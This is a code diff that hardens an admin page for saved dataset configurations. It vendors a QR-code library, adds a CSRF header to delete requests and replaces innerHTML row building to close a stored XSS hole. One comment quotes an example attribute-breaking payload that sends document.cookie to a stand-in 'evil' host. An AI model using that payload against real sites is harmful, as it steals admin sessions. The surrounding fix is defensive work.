@@ -52,11 +52,20 @@
   </div>
 </div>
 
-<!-- QR code generation. Pinned to 1.4.4 — same version Infra-TAK's hub uses (1.5.x's build/
-     isn't a standalone browser bundle). -->
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
+<!-- QR code generation. Vendored locally (C-38): this used to load from cdn.jsdelivr.net with no
+     Subresource Integrity inside an authenticated admin page, which is both a supply-chain hole
+     and — for a DDIL/air-gapped TAK deployment — a functional break, since every QR code on this
+     page threw "QRCode is not defined" the moment the CDN was unreachable. Pinned to 1.4.4; see
+     assets/featurelink-configurator/vendor/VENDOR.md for provenance and hashes. -->
+<script src="/featurelink-configs/configurator/vendor/qrcode-1.4.4.min.js"></script>
 <script>
 (function () {
+  // C-10: the double-submit CSRF token this page's mutating fetch() calls must echo back. Set as
+  // a SameSite=Lax cookie by featurelinkCsrf.service.js when the page was served.
+  function csrfToken() {
+    const m = document.cookie.match(/(?:^|;\s*)fl_csrf=([^;]*)/);
+    return m ? decodeURIComponent(m[1]) : '';
+  }
   const msgEl = document.getElementById('configsMsg');
   const loadingEl = document.getElementById('configsLoading');
   const tableEl = document.getElementById('configsTable');
@@ -105,27 +114,90 @@
     );
   };
 
+  /**
+   * C-05 — stored XSS, fixed.
+   *
+   * The QR button used to be built by concatenating an inline onclick handler containing the
+   * dataset id and the JSON-stringified dataset name, then assigning the whole row through
+   * `tr.innerHTML`. JSON stringification escapes for *JavaScript*, not for HTML,
+   * so the quote characters it emits terminated the `onclick="` attribute. A dataset named
+   *     x" onmouseover="fetch('//evil/'+document.cookie)
+   * — saveable by any logged-in non-admin, since `name` is only trimmed and truncated server-side
+   * — executed in the ADMIN's browser on this page. That is privilege escalation from any user to
+   * portal admin.
+   *
+   * Every cell is now built with createElement/textContent, and every action button carries its
+   * data in `data-*` attributes read by the delegated listener below. No string of user data ever
+   * reaches innerHTML, and there is not one inline handler left in this table.
+   */
+  function cell(tr, text) {
+    const td = document.createElement('td');
+    if (text !== undefined) td.textContent = text;
+    tr.appendChild(td);
+    return td;
+  }
+
   function renderRow(d) {
-    const source = d.source_type === 'url'
-      ? '<span class="muted">URL</span> <span style="word-break: break-all;">' + escapeHtml(d.source_url) + '</span>'
-      : '<span class="muted">File</span> ' + escapeHtml(d.file_name);
     const tr = document.createElement('tr');
-    tr.innerHTML =
-      '<td>' + escapeHtml(d.name) + '</td>' +
-      '<td>' + (d.group
-        ? '<span style="white-space: nowrap; font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 20px; background: var(--accent, #0078d4); color: #fff;">' + escapeHtml(d.group) + '</span>'
-        : '<span class="muted">—</span>') + '</td>' +
-      '<td>' + source + '</td>' +
-      '<td>' + d.field_count + '</td>' +
-      '<td>' + d.feature_count.toLocaleString() + '</td>' +
-      '<td>' + (d.updated_at ? new Date(d.updated_at).toLocaleString() : '') + '</td>' +
-      '<td>' +
-      '<div class="row" style="gap: 6px; justify-content: flex-end;">' +
-      '<a class="btn" href="/featurelink-configs/configurator?load=' + encodeURIComponent(d.id) + '">Open</a>' +
-      '<button class="btn" type="button" onclick="showQr(\'' + d.id + '\', ' + JSON.stringify(d.name) + ')">QR</button>' +
-      '<button class="btn" type="button" onclick="copyLink(\'' + d.id + '\')">Copy link</button>' +
-      '<button class="btn danger deleteBtn" data-id="' + d.id + '">Delete</button>' +
-      '</div></td>';
+
+    cell(tr, d.name == null ? '' : String(d.name));
+
+    const groupTd = cell(tr);
+    if (d.group) {
+      const badge = document.createElement('span');
+      badge.style.cssText = 'white-space: nowrap; font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 20px; background: var(--accent, #0078d4); color: #fff;';
+      badge.textContent = d.group;
+      groupTd.appendChild(badge);
+    } else {
+      const dash = document.createElement('span');
+      dash.className = 'muted';
+      dash.textContent = '—';
+      groupTd.appendChild(dash);
+    }
+
+    const srcTd = cell(tr);
+    const kind = document.createElement('span');
+    kind.className = 'muted';
+    kind.textContent = d.source_type === 'url' ? 'URL' : 'File';
+    srcTd.appendChild(kind);
+    srcTd.appendChild(document.createTextNode(' '));
+    const srcVal = document.createElement('span');
+    if (d.source_type === 'url') srcVal.style.wordBreak = 'break-all';
+    srcVal.textContent = (d.source_type === 'url' ? d.source_url : d.file_name) || '';
+    srcTd.appendChild(srcVal);
+
+    // Guarded: the API can legitimately return null/undefined here for a config saved before the
+    // field existed, and `.toLocaleString()` on that threw and blanked the whole page.
+    cell(tr, Number.isFinite(Number(d.field_count)) ? String(Number(d.field_count)) : '0');
+    cell(tr, Number.isFinite(Number(d.feature_count)) ? Number(d.feature_count).toLocaleString() : '0');
+    cell(tr, d.updated_at ? new Date(d.updated_at).toLocaleString() : '');
+
+    const actions = document.createElement('div');
+    actions.className = 'row';
+    actions.style.cssText = 'gap: 6px; justify-content: flex-end;';
+
+    const open = document.createElement('a');
+    open.className = 'btn';
+    open.href = '/featurelink-configs/configurator?load=' + encodeURIComponent(d.id);
+    open.textContent = 'Open';
+    actions.appendChild(open);
+
+    [
+      { action: 'qr', label: 'QR', cls: 'btn' },
+      { action: 'copy', label: 'Copy link', cls: 'btn' },
+      { action: 'delete', label: 'Delete', cls: 'btn danger' },
+    ].forEach((spec) => {
+      const b = document.createElement('button');
+      b.className = spec.cls;
+      b.type = 'button';
+      b.dataset.action = spec.action;
+      b.dataset.id = d.id;
+      b.dataset.name = d.name == null ? '' : String(d.name);
+      b.textContent = spec.label;
+      actions.appendChild(b);
+    });
+
+    cell(tr).appendChild(actions);
     return tr;
   }
 
@@ -150,23 +222,36 @@
           if (a.group !== b.group) return a.group ? -1 : 1;
           return 0;
         });
-        bodyEl.innerHTML = '';
+        bodyEl.textContent = '';
         sorted.forEach((ds) => bodyEl.appendChild(renderRow(ds)));
         tableEl.style.display = '';
-        bodyEl.querySelectorAll('.deleteBtn').forEach((btn) => {
-          btn.addEventListener('click', function () {
-            if (!confirm('Delete this saved dataset config? This cannot be undone.')) return;
-            fetch('/api/featurelink/admin/datasets/' + btn.dataset.id, { method: 'DELETE', credentials: 'same-origin' })
-              .then((r) => r.json())
-              .then((dd) => {
-                if (dd && dd.ok) loadConfigs();
-                else msgEl.textContent = (dd && dd.error) || 'Delete failed.';
-              });
-          });
-        });
       })
       .catch(() => { loadingEl.style.display = 'none'; msgEl.textContent = 'Failed to load configs.'; });
   }
+
+  // One delegated listener for the whole table — replaces the inline onclick handlers that were
+  // the C-05 XSS sink, and survives re-renders without rebinding.
+  bodyEl.addEventListener('click', function (ev) {
+    const btn = ev.target.closest('button[data-action]');
+    if (!btn || !bodyEl.contains(btn)) return;
+    const id = btn.dataset.id;
+    if (btn.dataset.action === 'qr') return showQr(id, btn.dataset.name);
+    if (btn.dataset.action === 'copy') return copyLink(id);
+    if (btn.dataset.action === 'delete') {
+      if (!confirm('Delete this saved dataset config? This cannot be undone.')) return;
+      fetch('/api/featurelink/admin/datasets/' + encodeURIComponent(id), {
+        method: 'DELETE',
+        credentials: 'same-origin',
+        headers: { 'X-FeatureLink-CSRF': csrfToken() },
+      })
+        .then((r) => r.json())
+        .then((dd) => {
+          if (dd && dd.ok) loadConfigs();
+          else msgEl.textContent = (dd && dd.error) || 'Delete failed.';
+        })
+        .catch(() => { msgEl.textContent = 'Delete failed.'; });
+    }
+  });
 
   loadConfigs();
 })();
